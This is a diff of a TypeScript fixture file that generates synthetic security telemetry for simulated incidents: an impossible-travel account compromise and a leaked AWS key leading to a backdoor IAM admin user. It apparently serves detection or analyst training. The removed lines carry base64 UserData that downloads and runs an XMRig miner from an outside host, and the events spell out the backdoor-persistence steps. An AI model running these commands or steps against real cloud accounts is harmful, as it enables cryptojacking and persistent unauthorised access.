+        "azure.signinlogs.properties.sessionId": sessionId,
+        "azure.signinlogs.properties.status.errorCode": 0,
+        "azure.signinlogs.properties.userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
         "GeoLocation.country_name":        "Nigeria",
         "GeoLocation.city_name":           "Lagos",
         "GeoLocation.location.lat":        6.5244,
@@ -2694,10 +2508,32 @@ export function impossibleTravelScenarioEvents() {
         "data.office365.RuleCondition":    "All messages",
         "data.office365.RuleName":         "Microsoft Outlook",
         "data.office365.UserType":         "0",
+        "data.office365.SessionId":        sessionId,
         "GeoLocation.country_name":        "Nigeria",
         "GeoLocation.city_name":           "Lagos",
         "GeoLocation.location.lat":        6.5244,
         "GeoLocation.location.lon":        3.3792,
+      },
+    },
+
+    // ── Step 4b: the VPN tunnel is used — internal traffic from the tunnel IP ───
+    {
+      id: "evt_imp_04b_vpn_traffic", ts: T(11 * MIN),
+      source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "net_connection",
+      user_email: user.email,
+      src_ip: "10.100.50.77", dst_ip: "10.20.8.40", dst_port: 445, protocol: "tcp",
+      severity: "medium", mitre_technique: "T1021.002",
+      network: { bytes_out: 61440, bytes_in: 2_411_724 },
+      description: "The VPN tunnel address 10.100.50.77 opened an SMB session to the engineering file server FS-ENG-01 (10.20.8.40).",
+      raw: {
+        "event.action": "network-connection-allowed", "event.outcome": "success",
+        "source.ip": "10.100.50.77", "source.port": "50122",
+        "destination.ip": "10.20.8.40", "destination.port": "445",
+        "network.protocol": "tcp", "network.transport": "tcp",
+        "network.application": "ms-ds-smbv3",
+        "pan.app": "ms-ds-smbv3", "pan.action": "allow", "pan.rule": "VPN-to-Internal",
+        "network.bytes_out": "61440", "network.bytes_in": "2411724",
+        "action_result": "allow",
       },
     },
 
@@ -2708,7 +2544,7 @@ export function impossibleTravelScenarioEvents() {
       event_type: "sharepoint_access", severity: "high",
       user_email: user.email,
       src_ip: nigIp,
-      mitre_technique: "T1530",
+      mitre_technique: "T1213.002",
       description: "847 files (2.3GB) were downloaded from the Engineering SharePoint site in 5 minutes from a Nigerian IP.",
       raw: {
         "data.office365.Operation":        "FileDownloaded",
@@ -2721,9 +2557,11 @@ export function impossibleTravelScenarioEvents() {
         "data.office365.SiteUrl":          "https://nexacorp.sharepoint.com/sites/Engineering",
         "data.office365.UserType":         "0",
         "data.office365.SourceFileName":   "PCB-Rev4-Schematics.pdf",
-        // Representative record — FileDownloaded is written per file; the
-        // 847-file / 2.3GB total (see description) is a SIEM-side aggregate
-        // across many records, not a count field on any single one.
+        "data.office365.SessionId":        sessionId,
+        "data.office365.UserAgent":        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
+        // Per-file FileDownloaded record; the 847-file / 2.3GB burst total is carried
+        // in file.count for the burst (a SIEM-side aggregate over the records).
+        "file.count":                      "847",
         "GeoLocation.country_name":        "Nigeria",
         "GeoLocation.city_name":           "Lagos",
         "GeoLocation.location.lat":        6.5244,
@@ -2738,447 +2576,301 @@ export function impossibleTravelScenarioEvents() {
   return { title: "Account Compromise — Impossible Travel", events, T, MIN, nigIp };
 }
 
-/** Telemetry half of `buildCloudCryptoMiningScenario`: the events and the story title, no answer key. */
-export function cloudCryptoMiningScenarioEvents() {
+/** Telemetry half of `buildCloudKeyLeakS3ExfilScenario`: the events and the story title, no answer key. */
+export function cloudKeyLeakS3ExfilScenarioEvents() {
+  // Leaked long-term IAM key in a public repo → recon → IAM backdoor user with
+  // its own key → S3 GetObject run → GuardDuty. Converted 2026-10-02 from the
+  // retired cryptomining story (no compute abuse, no mining): one goal, data theft.
   const B = new Date("2026-06-08T09:00:00Z").getTime();
   const T = (ms: number) => new Date(B + ms).toISOString();
   const MIN = 60_000;
 
-  const attackerIp = "203.189.76.14";
-  const accountId  = "247316892041";
-  const iamUser    = "rocketstack-ci-deploy";
-  const iamArn     = `arn:aws:iam::${accountId}:user/${iamUser}`;
+  const attackerIp   = "203.189.76.14";        // Singapore VPS — every attacker call comes from here
+  const ciEgressIp   = "54.210.17.88";         // the CI runner's normal egress (baseline)
+  const accountId    = "247316892041";
+  const iamUser      = "rocketstack-ci-deploy";
+  const iamArn       = `arn:aws:iam::${accountId}:user/${iamUser}`;
+  const leakedKey    = "AKIATQ4XW7Z2REXAMPLE";
   const backdoorUser = "svc-lambda-monitoring";
-  const s3Bucket   = "rocketstack-prod-customer-data";
+  const backdoorArn  = `arn:aws:iam::${accountId}:user/${backdoorUser}`;
+  const backdoorKey  = "AKIATQ4XW7Z2VEXAMPLE";
+  const s3Bucket     = "rocketstack-prod-customer-data";
+  const sampleObject = "exports/customers/2026-05/customers_full.csv.gz";
+  const cliAgent     = "aws-cli/2.15.0 Python/3.11.0 Linux/5.15.0";
+
+  /** The CloudTrail identity block of a call signed with one of the two IAM user keys. */
+  const asUser = (user: string, arn: string, key: string) => ({
+    "aws.cloudtrail.userIdentity.type": "IAMUser",
+    "aws.cloudtrail.userIdentity.userName": user,
+    "aws.cloudtrail.userIdentity.arn": arn,
+    "aws.cloudtrail.userIdentity.accountId": accountId,
+    "aws.cloudtrail.userIdentity.accessKeyId": key,
+  });
+  const fromAttacker = {
+    "aws.cloudtrail.sourceIPAddress": attackerIp,
+    "aws.cloudtrail.userAgent": cliAgent,
+    "source.ip": attackerIp,
+    "GeoLocation.country_name": "Singapore",
+    "GeoLocation.city_name": "Singapore",
+    "GeoLocation.location.lat": 1.3521,
+    "GeoLocation.location.lon": 103.8198,
+  };
 
   const events: TelemetryEvent[] = [
-    // ── T+0: GitHub Advanced Security detects leaked AWS key ─────────────────
+    // ── Baseline: how this key is normally used (CI runner, artifact upload) ──
     {
-      id: "evt_cm_01_github_alert", ts: T(0),
-      source: "vcs", vendor: "GitHub Advanced Security",
-      event_type: "threat_intel_match",
-      severity: "high", mitre_technique: "T1552.001", mitre_tactic: "Credential Access",
-      user_email: "a.levy@rocketstack.io",
-      description: "GitHub Advanced Security detected an AWS access key committed to the public repo rocketstack-io/deploy-scripts by a.levy@rocketstack.io.",
+      id: "evt_kl_00_baseline_ci", ts: T(-3 * 60 * MIN), is_baseline: true,
+      source: "cloudtrail", vendor: "AWS CloudTrail", event_type: "cloud_api_call",
+      severity: "informational", src_ip: ciEgressIp,
+      description: `${iamUser} (key ${leakedKey}) uploaded a build artifact to rocketstack-deploy-artifacts from the CI runner egress ${ciEgressIp}.`,
       raw: {
-        "event.provider": "GitHub Advanced Security",
-        "event.action": "secret_scanning_alert_created",
-        "event.outcome": "detected",
-        "github.secret_scanning.token_type": "aws_access_key_id",
-        "github.secret_scanning.secret": "AKIA247316892041LEAK",
-        "github.secret_scanning.commit": "f3a8c2d9b8e1f4a67c3d2e1f",
-        "github.secret_scanning.repo": "rocketstack-io/deploy-scripts",
-        "github.secret_scanning.author": "a.levy@rocketstack.io",
-        "github.secret_scanning.branch": "main",
-        "github.secret_scanning.file_path": "scripts/deploy.sh",
-        "github.secret_scanning.line_number": "14",
-        "github.secret_scanning.resolution": "reported_to_provider",
-        "github.secret_scanning.provider_notified": "Amazon Web Services",
-        "github.secret_scanning.push_protection_bypassed": "false",
-        "github.secret_scanning.alert_number": "42",
-        "threat.indicator.type": "aws-access-key",
-        "threat.indicator.provider": "GitHub Advanced Security",
-        "threat.indicator.confidence": "High",
-        "action_result": "detected",
+        "aws.cloudtrail.eventName": "PutObject",
+        "aws.cloudtrail.eventSource": "s3.amazonaws.com",
+        "aws.cloudtrail.awsRegion": "us-east-1",
+        "aws.cloudtrail.sourceIPAddress": ciEgressIp,
+        "aws.cloudtrail.userAgent": "aws-cli/2.15.0 Python/3.11.0 Linux/5.15.0 exe/x86_64.amzn.2 command/s3.cp",
+        ...asUser(iamUser, iamArn, leakedKey),
+        "aws.cloudtrail.requestParameters.bucketName": "rocketstack-deploy-artifacts",
+        "aws.cloudtrail.requestParameters.key": "builds/api/2026-06-08/api-4.18.2.tar.gz",
+        "event.outcome": "success",
+        "event.action": "PutObject",
+        "cloud.provider": "aws",
+        "cloud.region": "us-east-1",
+        "cloud.account.id": accountId,
+        "source.ip": ciEgressIp,
       },
     },
 
-    // ── T+2min: Attacker bot fires GetCallerIdentity — confirms creds valid ──
+    // ── T+0: the leak is detected — GitHub secret scanning on a public repo ──
     {
-      id: "evt_cm_02_getcaller", ts: T(2 * MIN),
-      source: "cloudtrail", vendor: "AWS CloudTrail",
-      event_type: "cloud_api_call",
+      id: "evt_kl_01_github_alert", ts: T(0),
+      source: "vcs", vendor: "GitHub Advanced Security", event_type: "threat_intel_match",
+      severity: "high", mitre_technique: "T1552.001", mitre_tactic: "Credential Access", is_detection: true,
+      user_email: "a.levy@rocketstack.io",
+      description: `GitHub secret scanning opened alert #42: AWS access key ${leakedKey} in scripts/deploy.sh line 14 of the public repo rocketstack-io/deploy-scripts, pushed by a.levy@rocketstack.io.`,
+      raw: {
+        "event.provider": "GitHub Advanced Security",
+        "event.action": "secret_scanning_alert_created",
+        "github.secret_scanning.alert_number": "42",
+        "github.secret_scanning.secret_type": "aws_access_key_id",
+        "github.secret_scanning.secret_type_display_name": "Amazon AWS Access Key ID",
+        "github.secret_scanning.secret": leakedKey,
+        "github.secret_scanning.validity": "active",
+        "github.secret_scanning.repository": "rocketstack-io/deploy-scripts",
+        "github.secret_scanning.repository_visibility": "public",
+        "github.secret_scanning.commit_sha": "76c770915494ad31afa9e44701a8f39a4924a4e3",
+        "github.secret_scanning.path": "scripts/deploy.sh",
+        "github.secret_scanning.start_line": "14",
+        "github.secret_scanning.pushed_by": "a.levy@rocketstack.io",
+        "github.secret_scanning.pushed_at": T(-4 * MIN),
+        "github.secret_scanning.push_protection_bypassed": "false",
+        "github.secret_scanning.state": "open",
+        "github.secret_scanning.publicly_leaked": "true",
+      },
+    },
+
+    // ── T+2: first use of the key from outside — who am I? ──
+    {
+      id: "evt_kl_02_getcaller", ts: T(2 * MIN),
+      source: "cloudtrail", vendor: "AWS CloudTrail", event_type: "cloud_api_call",
       severity: "high", mitre_technique: "T1078.004", mitre_tactic: "Initial Access",
       src_ip: attackerIp,
-      description: `GetCallerIdentity was called using the leaked access key from Singapore (${attackerIp}).`,
+      description: `GetCallerIdentity was called with access key ${leakedKey} (${iamUser}) from ${attackerIp} (Singapore).`,
       raw: {
         "aws.cloudtrail.eventName": "GetCallerIdentity",
         "aws.cloudtrail.eventSource": "sts.amazonaws.com",
         "aws.cloudtrail.awsRegion": "us-east-1",
-        "aws.cloudtrail.sourceIPAddress": attackerIp,
-        "aws.cloudtrail.userAgent": "aws-cli/2.15.0 Python/3.11.0 Linux/5.15.0",
-        "aws.cloudtrail.userIdentity.type": "IAMUser",
-        "aws.cloudtrail.userIdentity.userName": iamUser,
-        "aws.cloudtrail.userIdentity.arn": iamArn,
-        "aws.cloudtrail.userIdentity.accountId": accountId,
-        "aws.cloudtrail.userIdentity.accessKeyId": "AKIA247316892041LEAK",
-        "aws.cloudtrail.request_id": "a1b2c3d4-0002-0001-abcd-ef0000000002",
-        "aws.cloudtrail.errorCode": null,
-        "aws.cloudtrail.errorMessage": null,
-        "aws.cloudtrail.responseElements": null,
+        ...asUser(iamUser, iamArn, leakedKey),
+        ...fromAttacker,
         "event.outcome": "success",
         "event.action": "GetCallerIdentity",
         "cloud.provider": "aws",
         "cloud.region": "us-east-1",
         "cloud.account.id": accountId,
-        "source.ip": attackerIp,
-        "GeoLocation.country_name": "Singapore",
-        "GeoLocation.city_name": "Singapore",
-        "GeoLocation.location.lat": 1.3521,
-        "GeoLocation.location.lon": 103.8198,
-        "action_result": "allowed",
       },
     },
 
-    // ── T+4min: Rapid-fire cloud discovery — automated recon ─────────────────
+    // ── T+4: storage discovery (representative record of the List* burst) ──
     {
-      id: "evt_cm_03_discovery", ts: T(4 * MIN),
-      source: "cloudtrail", vendor: "AWS CloudTrail",
-      event_type: "cloud_api_call",
-      severity: "medium", mitre_technique: "T1580", mitre_tactic: "Discovery",
+      id: "evt_kl_03_list_buckets", ts: T(4 * MIN),
+      source: "cloudtrail", vendor: "AWS CloudTrail", event_type: "cloud_api_call",
+      severity: "medium", mitre_technique: "T1619", mitre_tactic: "Discovery",
       src_ip: attackerIp,
-      description: "The leaked key called ListBuckets, DescribeInstances, ListSecrets, and DescribeVpcs within 90 seconds, returning 12 S3 buckets and 9 Secrets Manager entries.",
+      description: `ListBuckets was called with access key ${leakedKey} from ${attackerIp}, followed within a minute by ListUsers and ListAttachedUserPolicies.`,
       raw: {
-        // Representative record — CloudTrail writes one record per API call
-        // with its own eventName/eventSource/eventID; ListBuckets, DescribeInstances,
-        // ListSecrets and DescribeVpcs (see description) are four separate
-        // records fired seconds apart, not one composite entry. This is the
-        // first of that 90-second burst.
         "aws.cloudtrail.eventName": "ListBuckets",
         "aws.cloudtrail.eventSource": "s3.amazonaws.com",
         "aws.cloudtrail.awsRegion": "us-east-1",
-        "aws.cloudtrail.sourceIPAddress": attackerIp,
-        "aws.cloudtrail.userAgent": "aws-cli/2.15.0 Python/3.11.0 Linux/5.15.0",
-        "aws.cloudtrail.userIdentity.type": "IAMUser",
-        "aws.cloudtrail.userIdentity.userName": iamUser,
-        "aws.cloudtrail.userIdentity.arn": iamArn,
-        "aws.cloudtrail.userIdentity.accountId": accountId,
-        "aws.cloudtrail.userIdentity.accessKeyId": "AKIA247316892041LEAK",
-        "aws.cloudtrail.request_id": "a1b2c3d4-0004-0001-abcd-ef0000000004",
-        "aws.cloudtrail.errorCode": null,
+        ...asUser(iamUser, iamArn, leakedKey),
+        ...fromAttacker,
         "event.outcome": "success",
         "event.action": "ListBuckets",
         "cloud.provider": "aws",
         "cloud.region": "us-east-1",
         "cloud.account.id": accountId,
-        "source.ip": attackerIp,
-        "GeoLocation.country_name": "Singapore",
-        "GeoLocation.location.lat": 1.3521,
-        "GeoLocation.location.lon": 103.8198,
-        "action_result": "allowed",
       },
     },
 
-    // ── T+6min: RunInstances us-east-1 — 8x p3.8xlarge with XMRig UserData ──
+    // ── T+10: a new IAM user — persistence independent of the leaked key ──
     {
-      id: "evt_cm_04_gpu_east", ts: T(6 * MIN),
-      source: "cloudtrail", vendor: "AWS CloudTrail",
-      event_type: "cloud_api_call",
-      severity: "critical", mitre_technique: "T1578.002", mitre_tactic: "Defense Evasion",
-      src_ip: attackerIp,
-      description: "The leaked key called RunInstances in us-east-1, launching 8 p3.8xlarge GPU instances whose UserData script downloads and runs an XMRig miner pointed at pool.minexmr.com.",
-      raw: {
-        "aws.cloudtrail.eventName": "RunInstances",
-        "aws.cloudtrail.eventSource": "ec2.amazonaws.com",
-        "aws.cloudtrail.awsRegion": "us-east-1",
-        "aws.cloudtrail.sourceIPAddress": attackerIp,
-        "aws.cloudtrail.userAgent": "aws-cli/2.15.0 Python/3.11.0 Linux/5.15.0",
-        "aws.cloudtrail.userIdentity.type": "IAMUser",
-        "aws.cloudtrail.userIdentity.userName": iamUser,
-        "aws.cloudtrail.userIdentity.arn": iamArn,
-        "aws.cloudtrail.userIdentity.accountId": accountId,
-        "aws.cloudtrail.userIdentity.accessKeyId": "AKIA247316892041LEAK",
-        "aws.cloudtrail.request_parameters": "{\"instanceType\": \"p3.8xlarge\", \"maxCount\": 8, \"minCount\": 8, \"imageId\": \"ami-0abcdef1234567890\", \"userData\": \"IyEvYmluL2Jhc2gKY3VybCAtTCBodHRwczovL3Bvb2wubWluZXhtci5jb20veG1yaWcgLW8gL3RtcC94bXJpZyAmJiBjaG1vZCAreCAvdG1wL3htcmlnICYmIC90bXAveG1yaWcgLW8gcG9vbC5taW5leG1yLmNvbTo0NDQ0\"}",
-        "aws.cloudtrail.request_parameters.instanceType": "p3.8xlarge",
-        "aws.cloudtrail.request_parameters.maxCount": "8",
-        "aws.cloudtrail.request_parameters.imageId": "ami-0abcdef1234567890",
-        "aws.cloudtrail.responseElements.instancesSet.items.0.instanceId": "i-0a1b2c3d4e5f60001",
-        "aws.cloudtrail.request_id": "a1b2c3d4-0006-0001-abcd-ef0000000006",
-        "aws.cloudtrail.errorCode": null,
-        "event.outcome": "success",
-        "event.action": "RunInstances",
-        "cloud.provider": "aws",
-        "cloud.region": "us-east-1",
-        "cloud.account.id": accountId,
-        "source.ip": attackerIp,
-        "GeoLocation.country_name": "Singapore",
-        "GeoLocation.location.lat": 1.3521,
-        "GeoLocation.location.lon": 103.8198,
-        "ec2.instance_type": "p3.8xlarge",
-        "ec2.instance_count": "8",
-        "action_result": "allowed",
-      },
-    },
-
-    // ── T+8min: RunInstances eu-west-1 — 6x p3.8xlarge, second region ────────
-    {
-      id: "evt_cm_05_gpu_eu", ts: T(8 * MIN),
-      source: "cloudtrail", vendor: "AWS CloudTrail",
-      event_type: "cloud_api_call",
-      severity: "critical", mitre_technique: "T1578.002", mitre_tactic: "Defense Evasion",
-      src_ip: attackerIp,
-      description: "The same key called RunInstances in eu-west-1, launching 6 more p3.8xlarge GPU instances.",
-      raw: {
-        "aws.cloudtrail.eventName": "RunInstances",
-        "aws.cloudtrail.eventSource": "ec2.amazonaws.com",
-        "aws.cloudtrail.awsRegion": "eu-west-1",
-        "aws.cloudtrail.sourceIPAddress": attackerIp,
-        "aws.cloudtrail.userAgent": "aws-cli/2.15.0 Python/3.11.0 Linux/5.15.0",
-        "aws.cloudtrail.userIdentity.type": "IAMUser",
-        "aws.cloudtrail.userIdentity.userName": iamUser,
-        "aws.cloudtrail.userIdentity.arn": iamArn,
-        "aws.cloudtrail.userIdentity.accountId": accountId,
-        "aws.cloudtrail.userIdentity.accessKeyId": "AKIA247316892041LEAK",
-        "aws.cloudtrail.request_parameters": "{\"instanceType\": \"p3.8xlarge\", \"maxCount\": 6, \"minCount\": 6, \"imageId\": \"ami-0abcdef1234567890\", \"userData\": \"IyEvYmluL2Jhc2gKY3VybCAtTCBodHRwczovL3htci5wb29sLm1pbmVyZ2F0ZS5jb20veG1yaWcgLW8gL3RtcC94bXJpZyAmJiBjaG1vZCAreCAvdG1wL3htcmlnICYmIC90bXAveG1yaWcgLW8geG1yLnBvb2wubWluZXJnYXRlLmNvbTo0NDQ0\"}",
-        "aws.cloudtrail.request_parameters.instanceType": "p3.8xlarge",
-        "aws.cloudtrail.request_parameters.maxCount": "6",
-        "aws.cloudtrail.request_parameters.imageId": "ami-0abcdef1234567890",
-        "aws.cloudtrail.responseElements.instancesSet.items.0.instanceId": "i-0a1b2c3d4e5f60002",
-        "aws.cloudtrail.request_id": "a1b2c3d4-0008-0001-abcd-ef0000000008",
-        "aws.cloudtrail.errorCode": null,
-        "event.outcome": "success",
-        "event.action": "RunInstances",
-        "cloud.provider": "aws",
-        "cloud.region": "eu-west-1",
-        "cloud.account.id": accountId,
-        "source.ip": attackerIp,
-        "GeoLocation.country_name": "Singapore",
-        "GeoLocation.location.lat": 1.3521,
-        "GeoLocation.location.lon": 103.8198,
-        "ec2.instance_type": "p3.8xlarge",
-        "ec2.instance_count": "6",
-        "action_result": "allowed",
-      },
-    },
-
-    // ── T+10min: CreateUser — attacker backdoor IAM account ───────────────────
-    {
-      id: "evt_cm_06_iam_user", ts: T(10 * MIN),
-      source: "cloudtrail", vendor: "AWS CloudTrail",
-      event_type: "account_create",
+      id: "evt_kl_04_create_user", ts: T(10 * MIN),
+      source: "cloudtrail", vendor: "AWS CloudTrail", event_type: "account_create",
       severity: "critical", mitre_technique: "T1136.003", mitre_tactic: "Persistence",
       src_ip: attackerIp,
-      description: `CreateUser was called to create a new IAM user, svc-lambda-monitoring, from ${attackerIp}.`,
+      description: `CreateUser created IAM user ${backdoorUser}, called with access key ${leakedKey} from ${attackerIp}.`,
       raw: {
         "aws.cloudtrail.eventName": "CreateUser",
         "aws.cloudtrail.eventSource": "iam.amazonaws.com",
         "aws.cloudtrail.awsRegion": "us-east-1",
-        "aws.cloudtrail.sourceIPAddress": attackerIp,
-        "aws.cloudtrail.userAgent": "aws-cli/2.15.0 Python/3.11.0 Linux/5.15.0",
-        "aws.cloudtrail.userIdentity.type": "IAMUser",
-        "aws.cloudtrail.userIdentity.userName": iamUser,
-        "aws.cloudtrail.userIdentity.arn": iamArn,
-        "aws.cloudtrail.userIdentity.accountId": accountId,
-        "aws.cloudtrail.userIdentity.accessKeyId": "AKIA247316892041LEAK",
-        "aws.cloudtrail.request_parameters": `{\"userName\": \"${backdoorUser}\", \"path\": \"/\"}`,
+        ...asUser(iamUser, iamArn, leakedKey),
+        ...fromAttacker,
         "aws.cloudtrail.requestParameters.userName": backdoorUser,
-        "aws.cloudtrail.responseElements.user.userId": "AIDA247316892041BACK",
-        "aws.cloudtrail.responseElements.user.arn": `arn:aws:iam::${accountId}:user/${backdoorUser}`,
+        "aws.cloudtrail.requestParameters.path": "/",
+        "aws.cloudtrail.responseElements.user.userName": backdoorUser,
+        "aws.cloudtrail.responseElements.user.userId": "AIDATQ4XW7Z2KF9MRS3QE",
+        "aws.cloudtrail.responseElements.user.arn": backdoorArn,
         "aws.cloudtrail.responseElements.user.createDate": T(10 * MIN),
-        "aws.cloudtrail.request_id": "a1b2c3d4-0010-0001-abcd-ef0000000010",
-        "aws.cloudtrail.errorCode": null,
         "event.outcome": "success",
         "event.action": "CreateUser",
         "cloud.provider": "aws",
         "cloud.region": "us-east-1",
         "cloud.account.id": accountId,
-        "source.ip": attackerIp,
-        "GeoLocation.country_name": "Singapore",
-        "GeoLocation.location.lat": 1.3521,
-        "GeoLocation.location.lon": 103.8198,
-        "iam.new_user": backdoorUser,
-        "action_result": "allowed",
       },
     },
 
-    // ── T+13min: AttachUserPolicy — AdministratorAccess on backdoor user ──────
+    // ── T+11: a long-term key for the new user (the key the S3 calls use) ──
     {
-      id: "evt_cm_07_iam_admin", ts: T(13 * MIN),
-      source: "cloudtrail", vendor: "AWS CloudTrail",
-      event_type: "cloud_role_change",
+      id: "evt_kl_05_create_key", ts: T(11 * MIN),
+      source: "cloudtrail", vendor: "AWS CloudTrail", event_type: "cloud_api_call",
       severity: "critical", mitre_technique: "T1098.001", mitre_tactic: "Persistence",
       src_ip: attackerIp,
-      description: "AttachUserPolicy attached the AWS managed policy AdministratorAccess to svc-lambda-monitoring — three minutes after the account was created.",
+      description: `CreateAccessKey issued access key ${backdoorKey} for ${backdoorUser}, called with access key ${leakedKey} from ${attackerIp}.`,
+      raw: {
+        "aws.cloudtrail.eventName": "CreateAccessKey",
+        "aws.cloudtrail.eventSource": "iam.amazonaws.com",
+        "aws.cloudtrail.awsRegion": "us-east-1",
+        ...asUser(iamUser, iamArn, leakedKey),
+        ...fromAttacker,
+        "aws.cloudtrail.requestParameters.userName": backdoorUser,
+        "aws.cloudtrail.responseElements.accessKey.userName": backdoorUser,
+        "aws.cloudtrail.responseElements.accessKey.accessKeyId": backdoorKey,
+        "aws.cloudtrail.responseElements.accessKey.status": "Active",
+        "aws.cloudtrail.responseElements.accessKey.createDate": T(11 * MIN),
+        "event.outcome": "success",
+        "event.action": "CreateAccessKey",
+        "cloud.provider": "aws",
+        "cloud.region": "us-east-1",
+        "cloud.account.id": accountId,
+      },
+    },
+
+    // ── T+13: full admin on the new user ──
+    {
+      id: "evt_kl_06_attach_admin", ts: T(13 * MIN),
+      source: "cloudtrail", vendor: "AWS CloudTrail", event_type: "cloud_role_change",
+      severity: "critical", mitre_technique: "T1098.003", mitre_tactic: "Persistence",
+      src_ip: attackerIp,
+      description: `AttachUserPolicy attached the AWS managed policy AdministratorAccess to ${backdoorUser}, called with access key ${leakedKey} from ${attackerIp}.`,
       raw: {
         "aws.cloudtrail.eventName": "AttachUserPolicy",
         "aws.cloudtrail.eventSource": "iam.amazonaws.com",
         "aws.cloudtrail.awsRegion": "us-east-1",
-        "aws.cloudtrail.sourceIPAddress": attackerIp,
-        "aws.cloudtrail.userAgent": "aws-cli/2.15.0 Python/3.11.0 Linux/5.15.0",
-        "aws.cloudtrail.userIdentity.type": "IAMUser",
-        "aws.cloudtrail.userIdentity.userName": iamUser,
-        "aws.cloudtrail.userIdentity.arn": iamArn,
-        "aws.cloudtrail.userIdentity.accountId": accountId,
-        "aws.cloudtrail.userIdentity.accessKeyId": "AKIA247316892041LEAK",
-        "aws.cloudtrail.request_parameters": `{\"userName\": \"${backdoorUser}\", \"policyArn\": \"arn:aws:iam::aws:policy/AdministratorAccess\"}`,
+        ...asUser(iamUser, iamArn, leakedKey),
+        ...fromAttacker,
         "aws.cloudtrail.requestParameters.userName": backdoorUser,
         "aws.cloudtrail.requestParameters.policyArn": "arn:aws:iam::aws:policy/AdministratorAccess",
-        "aws.cloudtrail.request_id": "a1b2c3d4-0013-0001-abcd-ef0000000013",
-        "aws.cloudtrail.errorCode": null,
         "event.outcome": "success",
         "event.action": "AttachUserPolicy",
         "cloud.provider": "aws",
         "cloud.region": "us-east-1",
         "cloud.account.id": accountId,
-        "source.ip": attackerIp,
-        "GeoLocation.country_name": "Singapore",
-        "GeoLocation.location.lat": 1.3521,
-        "GeoLocation.location.lon": 103.8198,
-        "iam.target_user": backdoorUser,
-        "iam.policy_attached": "AdministratorAccess",
-        "iam.policy_arn": "arn:aws:iam::aws:policy/AdministratorAccess",
-        "iam.policy_type": "AWS Managed",
-        "action_result": "allowed",
       },
     },
 
-    // ── T+16min: GuardDuty CryptoCurrency:EC2/BitcoinTool.B!DNS ─────────────
+    // ── T+16: GuardDuty on the IAM changes made with the CI key from a new IP ──
     {
-      id: "evt_cm_08_guardduty", ts: T(16 * MIN),
-      source: "cloudtrail", vendor: "AWS GuardDuty",
-      event_type: "ueba_anomaly",
-      severity: "critical", mitre_technique: "T1496", mitre_tactic: "Impact",
-      dst_ip: attackerIp,
-      description: "AWS GuardDuty raised CryptoCurrency:EC2/BitcoinTool.B!DNS (severity 7.8) — 14 EC2 instances querying cryptocurrency mining pool domains at 847 DNS requests per minute.",
-      raw: {
-        "event.provider": "AWS GuardDuty",
-        "event.action": "GuardDutyFinding",
-        "event.outcome": "detected",
-        "aws.guardduty.finding.type": "CryptoCurrency:EC2/BitcoinTool.B!DNS",
-        "aws.guardduty.finding.severity": 7.8,
-        "aws.guardduty.finding.title": "EC2 instance querying a cryptocurrency-related domain",
-        "aws.guardduty.finding.description": "14 EC2 instances in your AWS account are querying a domain name associated with cryptocurrency-related activity. This activity may indicate that your credentials are compromised.",
-        "aws.guardduty.finding.id": "gd-97f45e3afc637a1614ec711f50bb1286",
-        "aws.guardduty.finding.resource.instanceDetails.instanceId": "i-0a1b2c3d4e5f6a7b8",
-        "aws.guardduty.finding.resource.instanceDetails.instanceType": "p3.8xlarge",
-        "aws.guardduty.finding.resource.resourceType": "Instance",
-        "aws.guardduty.finding.action.dnsRequestAction.domain": "pool.minexmr.com",
-        "aws.guardduty.finding.action.dnsRequestAction.protocol": "UDP",
-        "aws.guardduty.finding.action.dnsRequestAction.blocked": false,
-        "aws.guardduty.finding.service.additionalInfo.domain2": "xmr.pool.minergate.com",
-        "aws.guardduty.finding.service.count": 847,
-        "aws.guardduty.finding.service.detector_id": "det-a1b2c3d4e5f6a1b2c3d4",
-        "aws.guardduty.finding.accountId": accountId,
-        "aws.guardduty.finding.region": "us-east-1",
-        "aws.guardduty.finding.count": 14,
-        "aws.guardduty.finding.created_at": T(16 * MIN),
-        "aws.guardduty.finding.category": "CRYPTOCURRENCY",
-        "cloud.provider": "aws",
-        "cloud.account.id": accountId,
-        "mining.pool.primary": "pool.minexmr.com",
-        "mining.pool.secondary": "xmr.pool.minergate.com",
-        "action_result": "detected",
-      },
-    },
-
-    // ── T+20min: AWS Cost Anomaly Detection — $47k in 6 hours ────────────────
-    {
-      id: "evt_cm_09_billing", ts: T(20 * MIN),
-      source: "siem", vendor: "AWS Cost Anomaly Detection",
-      event_type: "ueba_anomaly",
-      severity: "critical", mitre_technique: "T1496", mitre_tactic: "Impact",
-      description: "AWS Cost Anomaly Detection flagged a $47,320 spend spike over 6 hours against an $800/day baseline, attributed to p3.8xlarge usage in us-east-1 and eu-west-1.",
-      raw: {
-        "event.provider": "AWS Cost Anomaly Detection",
-        "event.action": "AnomalyDetected",
-        "event.outcome": "detected",
-        "aws.cost_anomaly.monitor_name": "EC2 Spend Monitor",
-        "aws.cost_anomaly.monitor_arn": `arn:aws:ce::${accountId}:anomalymonitor/ami-ec2-spend`,
-        "aws.cost_anomaly.anomaly_id": "anomaly-a1b2c3d4-e5f6-0009",
-        "aws.cost_anomaly.total_impact": "47320.00",
-        "aws.cost_anomaly.anomalous_spend": "47320.00",
-        "aws.cost_anomaly.baseline_spend": "800.00",
-        "aws.cost_anomaly.expected_spend": "800.00",
-        "aws.cost_anomaly.detection_method": "CONTEXTUAL",
-        "aws.cost_anomaly.root_cause.service": "Amazon EC2",
-        "aws.cost_anomaly.root_cause.region": "us-east-1",
-        "aws.cost_anomaly.root_cause.instance_type": "p3.8xlarge",
-        "aws.cost_anomaly.root_cause.usage_type": "BoxUsage:p3.8xlarge",
-        "aws.cost_anomaly.sns_topic": "arn:aws:sns:us-east-1:247316892041:billing-alerts",
-        "aws.cost_anomaly.notification_email": "billing-alerts@rocketstack.io",
-        "aws.cost_anomaly.time_period.start": T(0),
-        "aws.cost_anomaly.time_period.end": T(20 * MIN),
-        "cloud.provider": "aws",
-        "cloud.account.id": accountId,
-        "action_result": "alerted",
-      },
-    },
-
-    // ── T+22min: PutBucketPolicy — makes prod S3 bucket public ───────────────
-    {
-      id: "evt_cm_10_bucket_public", ts: T(22 * MIN),
-      source: "cloudtrail", vendor: "AWS CloudTrail",
-      event_type: "cloud_api_call",
-      severity: "critical", mitre_technique: "T1530", mitre_tactic: "Collection",
+      id: "evt_kl_07_gd_persistence", ts: T(16 * MIN),
